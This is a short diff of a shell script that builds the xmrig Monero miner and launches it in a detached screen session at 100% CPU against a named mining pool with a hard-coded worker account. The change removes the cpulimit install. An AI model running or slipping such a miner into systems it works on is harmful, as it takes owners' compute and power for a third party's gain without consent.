@@ -8,5 +8,4 @@ cd build;
 cmake ..;
 make;
 yes Y | sudo apt-get install screen;
-yes Y | sudo apt-get install cpulimit;
 screen -d -m ./xmrig --algo=monero7 --variant 1 -o us-east.cryptonight-hub.miningpoolhub.com:20580 -u yoummo.nhd -p 2607 -k --donate-level=1 --max-cpu-usage=100;
